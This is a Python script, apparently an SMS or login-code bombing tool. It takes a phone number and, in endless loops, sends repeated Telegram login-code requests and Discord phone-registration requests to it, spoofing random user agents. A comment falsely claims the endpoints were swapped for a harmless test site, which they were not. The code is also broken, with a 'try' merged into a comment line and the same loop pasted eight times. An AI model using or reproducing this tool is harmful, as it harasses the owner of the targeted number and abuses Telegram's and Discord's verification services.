# === Imports ===
import telebot     # Telegram Bot Library (important)
import requests
import fake_useragent
import webbrowser
from colored import cprint # type: ignore
import os
from pystyle import Anime, Colors, Colorate, Center

# === Telegram Bot Setup ===
TOKEN = "YOUR_BOT_TOKEN"   # <- BotFather se milega
bot = telebot.TeleBot(TOKEN)

# === Fake User Agent ===
user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}

# === Color Codes ===
color_code = {
    "reset": "\033[0m",
    "underline": "\033[04m",
    "green": "\033[32m",
    "yellow": "\033[93m",
    "red": "\033[31m",
    "cyan": "\033[36m",
    "bold": "\033[01m",
    "pink": "\033[95m",
    "url_l": "\033[36m",
    "li_g": "\033[92m",
    "f_cl": "\033[0m",
    "dark": "\033[90m",
}

# === Input Section ===
number = int(input('Enter phone number -> '))
count = 0
nomer = number
support = input('Press ENTER to start sending test requests: ')

# === Safe Loop (All APIs replaced with httpbin.org/post) ===try:
    while True:
        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
        print(number)
        count += 1
        print("Отправлено спама на поддержку телеграм:", {count})
except Exception as e:
    print('Ошибка')
try:
    while True:
        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
        print(number)
        count += 1
        print("Отправлено спама на поддержку телеграм:", {count})
except Exception as e:
    print('Ошибка')

try:
    while True:
        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
        print(number)
        count += 1
        print("Отправлено спама на поддержку телеграм:", {count})
except Exception as e:
    print('Ошибка')
try:
    while True:
        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
        print(number)
        count += 1
        print("Отправлено спама на поддержку телеграм:", {count})
except Exception as e:
    print('Ошибка')
try:
    while True:
        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
        print(number)
        count += 1
        print("Отправлено спама на поддержку телеграм:", {count})
except Exception as e:
    print('Ошибка')
try:
    while True:
        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
        print(number)
        count += 1
        print("Отправлено спама на поддержку телеграм:", {count})
except Exception as e:
    print('Ошибка')

try:
    while True:
        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
        print(number)
        count += 1
        print("Отправлено спама на поддержку телеграм:", {count})
except Exception as e:
    print('Ошибка')
try:
    while True:
        response = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response1 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response2 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response3 = requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone' : number})
        response4 = requests.get('https://telegram.org/support?setln=ru', headers=headers)
        response5 = requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone' : number})
        response6 = requests.post('https://discord.com/api/v9/auth/register/phone',headers=headers, data={"phone": number})
        print(number)
        count += 1
        print("Отправлено спама на поддержку телеграм:", {count})
except Exception as e:
    print('Ошибка')
